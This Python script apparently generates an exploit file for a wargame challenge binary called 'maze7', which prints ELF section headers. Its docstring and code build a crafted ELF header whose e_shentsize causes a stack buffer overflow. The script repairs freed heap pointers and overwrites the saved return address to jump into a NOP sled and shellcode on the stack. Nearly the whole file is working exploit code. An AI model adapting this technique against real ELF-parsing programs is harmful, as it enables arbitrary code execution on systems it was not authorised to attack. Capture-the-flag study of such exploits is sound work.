#!/usr/bin/env python3
"""Maze L7 exploit-file generator, v2.

maze7 prints ELF section headers but takes every "parameter" from the crafted
file's own ELF header (main passes the raw header words to Print_Shdrs):

    [ebp+0x8]  = fd
    [ebp+0xc]  = e_shoff      -> both lseek offsets (shdr array + back again)
    [ebp+0x10] = e_shstrndx   -> sh = buf + idx*40 (strtab selection)
    [ebp+0x14] = e_shnum      -> malloc(e_shnum*40), shdr read, loop bound (jle!)
    [ebp+0x18] = e_shentsize  -> READ SIZE of the in-loop read(fd, ebp-0x3c, ..)

The loop reads e_shentsize bytes into the 0x34-byte stack buffer once per
iteration (single iteration: i=0 runs, the read rewrites i=1, i++ -> 2 > 1
exits). e_shentsize=0x100 overflows far past saved EIP at buf+0x40.

The heap is rw-p (NOT executable; GNU_STACK RWE only covers the stack), so the
shellcode lives IN the stack payload at buf+0x60 and EIP -> buf+0x60 (stack
address -> sweep). free() runs before the ret on the pointers at buf+0x28 /
buf+0x30, repaired with the real malloc'd addresses (gdb-measured, ASLR off:
shdrbuf=0x804d020, strtab=0x804d050).

Shellcode stack usage after ret: esp = buf+0x44, pushes go down to ~buf+0x08,
buffer sub esp,0x20 -> ~buf-0x1c: inside Print_Shdrs' free locals, safe.

printf %s argument = strtab + sh_name; strtab starts with a NUL so it prints
an empty string (a long garbage %s crashed vfprintf earlier).
"""
import struct, sys

SHOFF      = 0x40     # payload region (== e_shoff, both lseeks)
STRTAB_OFF = 0x200
STRTAB_SZ  = 0x80
PAY_SZ     = 0x100    # = e_shentsize: bytes read into the stack buffer
SC_OFF     = 0x60     # shellcode offset within the payload (== within buf)
SHDRBUF    = 0x0804d020
STRTAB     = 0x0804d050


def build(buf_addr: int, shellcode: bytes) -> bytes:
    assert len(shellcode) <= PAY_SZ - SC_OFF - 0x10

    # ELF header (52 bytes) — main reads exactly 0x34.
    eh  = b"\x7fELF" + bytes([1, 1, 1, 0]) + b"\x00" * 8   # e_ident
    eh += struct.pack("<HHIIIIIHHHHHH",
                      1,          # e_type   REL
                      3,          # e_machine i386
                      1,          # e_version
                      0,          # e_entry
                      0,          # e_phoff
                      SHOFF,      # e_shoff  -> both lseeks
                      0,          # e_flags
                      52,         # e_ehsize
                      0,          # e_phentsize
                      0,          # e_phnum
                      PAY_SZ,     # e_shentsize == OVERFLOW READ SIZE
                      1,          # e_shnum  (single loop iteration)
                      0)          # e_shstrndx -> shdr0 selects the strtab
    assert len(eh) == 0x34

    # Payload region at e_shoff: shdr0 (40 bytes) + overflow control block.
    p  = struct.pack("<IIIIIIIIII",
                     0,            # sh_name=0 -> printf prints strtab+0 (NUL)
                     1,            # sh_type
                     0,            # sh_flags
                     0,            # sh_addr
                     STRTAB_OFF,   # sh_offset
                     STRTAB_SZ,    # sh_size
                     0, 0, 0, 0)   # sh_link/info/addralign/entsize
    assert len(p) == 0x28
    p += struct.pack("<IIIIIII",   # 0x28..0x44: overflow control block
                     STRTAB,       # 0x28 [ebp-0x14] free(strtab) - repaired
                     0,            # 0x2c
                     SHDRBUF,      # 0x30 [ebp-0xc]  free(shdrbuf) - repaired
                     1,            # 0x34 [ebp-0x8]  i -> 2 > e_shnum: exit
                     0,            # 0x38 saved ebx (don't care)
                     0,            # 0x3c saved ebp (don't care)
                     buf_addr + SC_OFF)  # 0x40 saved EIP -> shellcode on stack
    p += b"\x90" * (SC_OFF - len(p))     # NOP sled up to the shellcode
    p += shellcode
    p += b"\x00" * (PAY_SZ - len(p))

    f = bytearray(eh)
    f += b"\x00" * (SHOFF - len(eh))     # pad header so payload lands at e_shoff
    f += p
    f += b"\x00" * (STRTAB_OFF - len(f))
    f += b"\x00" * STRTAB_SZ             # strtab: leading NUL, empty %s
    return bytes(f)


if __name__ == "__main__":
    buf = int(sys.argv[1], 16)
    sc = bytes.fromhex(sys.argv[2]) if len(sys.argv) > 2 else b"\x90" * 16
    sys.stdout.buffer.write(build(buf, sc))
